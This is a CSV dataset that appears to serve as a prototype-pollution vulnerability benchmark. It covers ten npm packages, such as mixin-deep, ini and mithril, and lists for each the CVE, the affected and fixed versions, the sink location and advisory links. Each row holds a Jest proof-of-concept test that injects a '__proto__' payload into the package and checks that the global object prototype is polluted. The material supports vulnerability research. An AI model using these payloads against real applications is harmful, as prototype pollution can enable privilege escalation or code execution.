Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
prototype-pollution,CVE-2020-28269,field,1.0.1,n/a,prototype-pollution/field_1.0.1,"//https://snyk.io/vuln/SNYK-JS-FIELD-1039884
test(""prototype pollution in field "", () => {
  expect({}.polluted).toBe(undefined);

  const field = require(""field"");
  const obj = {};
  field.set(obj, ""__proto__.polluted"", ""yes"");

  expect(obj.polluted).toBe(""yes"");
});
",n/a,lib/field.js:50:20,https://security.snyk.io/vuln/SNYK-JS-FIELD-1039884; https://github.com/advisories/GHSA-hm82-qr45-h7mw
prototype-pollution,CVE-2021-23624,dotty,0.0.1,0.1.2,prototype-pollution/dotty_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25912
test(""prototype pollution in dotty"", () => {
  expect({}.polluted).toBe(undefined);

  const dotty = require(""dotty"");
  dotty.put({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/deoxxa/dotty/commit/88f61860dcc274a07a263c32cbe9d44c24ef02d7,lib/index.js:147:17,https://security.snyk.io/vuln/SNYK-JS-DOTTY-1577292; https://github.com/advisories/GHSA-6g47-63mv-qpgh
prototype-pollution,CVE-2020-7765,@firebase/util,0.3.2,0.3.4,prototype-pollution/firebase-util_0.3.2,"//https://hackerone.com/reports/1001218
test(""prototype pollution in @firebase/util"", () => {
  expect({}.polluted).toBe(undefined);

  const utils = require(""@firebase/util"");
  const source = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  utils.deepExtend({}, source);

  expect({}.polluted).toBe(""yes"");
});
",n/a,util/src/deepCopy.ts:68:49,https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324; https://github.com/advisories/GHSA-fpm5-vv97-jfwg
prototype-pollution,CVE-2020-28472,@aws-sdk/shared-ini-file-loader,1.0.0-rc.8,1.0.0-rc.9,prototype-pollution/aws-sdk-shared-ini-file-loader_1.0.0-rc.8,"//https://security.snyk.io/vuln/SNYK-JS-AWSSDKSHAREDINIFILELOADER-1049304
test(""prototype pollution in @aws-sdk/shared-ini-file-loader"", () => {
  expect({}.polluted).toBe(undefined);
  var fs = require(""fs"");
  var sharedIniFileLoader = require(""@aws-sdk/shared-ini-file-loader"");

  var parsed = sharedIniFileLoader.loadSharedConfigFiles({
    filepath: ""./payload.toml"",
  });
  parsed.then(() => {
    expect({}.polluted).toBe(""yes"");
  });
});
",https://github.com/aws/aws-sdk-js/pull/3585/commits/7d72aff2a941173733fcb6741b104cd83d3bc611,shared-ini-file-loader/src/index.ts:108:20,https://security.snyk.io/vuln/SNYK-JS-AWSSDKSHAREDINIFILELOADER-1049304; https://github.com/advisories/GHSA-rrc9-gqf8-8rwg
prototype-pollution,CVE-2020-28495,total.js,3.4.6,3.4.7,prototype-pollution/total.js_3.4.6,"//https://snyk.io/vuln/SNYK-JS-TOTALJS-1046671
test(""prototype pollution in total.js"", () => {
  const total = require(""total.js"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  U.set({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/totaljs/framework/commit/b3f901561d66ab799a4a99279893b94cad7ae4ff,"utils.js:6624:11, <anonymous",https://security.snyk.io/vuln/SNYK-JS-TOTALJS-1046671; https://github.com/advisories/GHSA-6cf8-qhqj-vjqm
prototype-pollution,,mithril,1.0.0,1.1.7,prototype-pollution/mithril_1.0.0,"//https://snyk.io/vuln/SNYK-JS-MITHRIL-460113
test(""prototype pollution in mithril"", () => {
  require(""mithril/test-utils/browserMock"")(global);
  const m = require(""mithril"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  m.parseQueryString(""__proto__%5Bpolluted%5D=yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/MithrilJS/mithril.js/commit/97fa1788c2184ff4b87fd3f558b7003f9eeee2b1,mithril.js:982:19,https://security.snyk.io/vuln/SNYK-JS-MITHRIL-460113; https://github.com/advisories/GHSA-c3px-v9c7-m734
prototype-pollution,CVE-2020-7788,ini,1.3.5,n/a,prototype-pollution/ini_1.3.5,"//https://snyk.io/vuln/SNYK-JS-INI-1048974
test(""prototype pollution in ini"", () => {
  const fs = require(""fs"");
  const path = require(""path"");
  const ini = require(""ini"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  ini.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.ini""), ""utf-8""));

  expect({}.polluted).toBe(""yes"");
});
",n/a,ini.js:109:14,https://security.snyk.io/vuln/SNYK-JS-INI-1048974; https://github.com/advisories/GHSA-qqgx-2p2h-9c37
prototype-pollution,CVE-2018-3719,mixin-deep,1.3.0,1.3.1,prototype-pollution/mixin-deep_1.3.0,"//https://hackerone.com/reports/311236
test(""prototype pollution in mixin-deep "", () => {
  const mixin = require(""mixin-deep"");
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  let obj = {};

  expect({}.polluted).toBe(undefined);

  mixin({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/mixin-deep/commit/578b0bc5e74e14de9ef4975f504dc698796bdf9c,index.js:30:15,https://hackerone.com/reports/311236; https://security.snyk.io/vuln/npm:mixin-deep:20180215; https://github.com/advisories/GHSA-3mpr-hq3p-49h9
prototype-pollution,CVE-2020-7792,mout,1.0.0,1.2.3,prototype-pollution/mout_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
test(""prototype pollution in mout "", () => {
  var mout = require(""mout"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  mout.object.set(obj, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,object/set.js:9:48,https://security.snyk.io/vuln/SNYK-JS-MOUT-1014544; 
prototype-pollution,CVE-2021-23444,jointjs,2.2.1,3.4.2,prototype-pollution/jointjs_2.2.1,"//https://snyk.io/vuln/SNYK-JS-JOINTJS-1024444
test(""prototype pollution in jointjs"", () => {
  expect({}.polluted).toBe(undefined);

  const jointjs = require(""jointjs"");
  jointjs.util.setByPath({}, ""__proto__/polluted"", ""yes"", ""/"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/clientIO/joint/commit/e5bf89efef6d5ea572d66870ffd86560de7830a8,dist/joint.min.js:49:1313,https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578; https://github.com/advisories/GHSA-f3pp-32qc-36w4
